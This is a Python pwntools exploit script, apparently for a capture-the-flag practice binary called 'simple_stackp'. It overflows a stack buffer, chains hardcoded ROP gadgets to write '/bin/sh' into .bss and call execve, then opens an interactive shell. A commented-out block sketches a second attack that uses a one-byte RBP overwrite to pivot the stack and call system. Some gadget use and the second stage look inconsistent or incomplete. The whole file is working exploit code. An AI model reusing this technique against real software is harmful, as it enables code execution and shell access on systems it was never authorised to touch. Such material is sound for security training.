from pwn import *

# target = process('./simple_stackp')
context.binary = './simple_stackp'
elf = context.binary 

pop_rax = p64(0x42962b)
pop_rdi = p64(0x402218)
pop_rsi_rbp = p64(0x40b4d4)  # pop rsi; pop rbp; ret
pop_rdx_leave = p64(0x466d23) # pop rdx; leave; ret
syscall = p64(0x4012d1)
ret = p64(0x40101a)           # Stack alignment
mov_ptr_rax_rdx = p64(0x4482d7)

bss = 0x4abac0 + 0x100

# Build ROP chain
rop = b""
rop += pop_rax
rop += p64(bss)
rop += pop_rdx_leave
rop += b'/bin/sh\x00'
rop += mov_ptr_rax_rdx  # Write to .bss

# Set up execve
rop += pop_rax
rop += p64(59)          # syscall number
rop += pop_rdi
rop += p64(bss)         # filename
rop += pop_rsi_rbp
rop += p64(0)           # argv
rop += p64(0)           # dummy RBP
rop += ret              # Alignment
rop += syscall

# Send payload
payload = flat({
    128: b'B'*8,      # Overwrite RBP
    136: rop
})

p = process()
p.sendline(b"129")    # Trigger overflow
p.send(payload)
p.interactive()
'''
payload = ret*((128 - len(rop) / 8)) + rop + "\x00"

target.sendline("129")

raw_input()

target.sendline(payload)

target.interactive()

context.binary = './simple_stackp'
elf = context.binary
libc = elf.libc

# Find gadgets
leave_ret = 0x4018e6
pop_rdi = 0x402218    # pop rdi; ret
pop_rsi = 0x402216    # pop rsi; ret (find with ROPgadget)
pop_rdx = 0x402215    # pop rdx; ret (find with ROPgadget)

# Memory locations
pivot_addr = 0x4abac0  # .bss address
writeable_addr = pivot_addr + 0x100  # Safe area in .bss

# 1. First payload: 1-byte overflow to pivot stack
payload = b"A"*128
payload += p64(pivot_addr)[:1]  # Overwrite LSB of RBP

# 2. Second stage: Write "/bin/sh" then call system()
stage2 = flat([
    # Write "/bin/sh" to memory
    pop_rdi,
    writeable_addr,
    pop_rsi,
    b'/bin/sh\x00',
    elf.plt['memcpy'],  # Or use gets() if available
    
    # Call system("/bin/sh")
    pop_rdi,
    writeable_addr,
    elf.plt['system']
])

p = process()
p.sendline(b"129")  # Trigger overflow
p.send(payload)
p.send(stage2)
p.interactive()
'''